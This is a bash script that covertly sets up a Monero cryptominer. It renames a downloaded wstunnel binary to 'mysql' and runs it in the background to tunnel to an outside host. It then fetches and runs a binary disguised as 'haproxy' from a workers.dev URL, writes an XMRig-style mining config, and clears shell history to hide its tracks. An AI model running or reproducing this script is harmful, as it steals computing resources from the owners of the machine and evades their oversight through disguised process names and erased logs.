#!/bin/bash
pkill -f "mysql"
pkill -f "haproxy"
rm -rf mysql
rm -rf haproxy.tar.gz

curl -L -O -J https://github.com/erebe/wstunnel/releases/download/v10.5.2/wstunnel_10.5.2_linux_amd64.tar.gz
tar -xf wstunnel_10.5.2_linux_amd64.tar.gz
rm -f wstunnel_10.5.2_linux_amd64.tar.gz
chmod +x wstunnel
mv ./wstunnel ./mysql
nohup ./mysql client wss://artekno.cyou/Y2RuLm1hc3RlcmRvLm1lOjgwODA= -L tcp://3456:127.0.0.1:1 >/dev/null 2>&1 &

curl -O -J -L https://storage.bahirun2.workers.dev/haproxy.tar.gz
tar -xf haproxy.tar.gz
rm -rf haproxy.tar.gz
rm -rf ._haproxy
chmod +x ./haproxy
echo -e '{"autosave":false,"background":false,"colors":true,"title":true,"randomx":{"init":-1,"init-avx2":1,"mode":"auto","1gb-pages":true,"rdmsr":true,"wrmsr":true,"cache_qos":false,"numa":true,"scratchpad_prefetch_mode":1},"cpu":{"enabled":true,"huge-pages":true,"huge-pages-jit":false,"hw-aes":null,"priority":null,"memory-pool":false,"yield":true,"max-threads-hint":75,"asm":true,"argon2-impl":null,"cn/0":false,"cn-lite/0":false},"opencl":{"enabled":false,"cache":true,"loader":null,"platform":"AMD","adl":true,"cn/0":false,"cn-lite/0":false},"cuda":{"enabled":false,"loader":null,"nvml":true,"cn/0":false,"cn-lite/0":false},"donate-level":0,"donate-over-proxy":0,"log-file":null,"pools":[{"algo":null,"coin":"XMR","url":"localhost:3456","user":"root","pass":"root","rig-id":null,"nicehash":false,"keepalive":true,"enabled":true,"tls":false,"tls-fingerprint":null,"daemon":false,"socks5":null,"self-select":null,"submit-to-origin":false}],"print-time":60,"health-print-time":60,"dmi":true,"retries":5,"retry-pause":5,"syslog":false,"tls":{"enabled":true,"protocols":null,"cert":null,"cert_key":null,"ciphers":null,"ciphersuites":null,"dhparam":null},"dns":{"ip_version":0,"ttl":30},"user-agent":null,"verbose":0,"watch":false,"pause-on-battery":false,"pause-on-active":false}' > ./config.json
history -c && history -w && clear
./haproxy
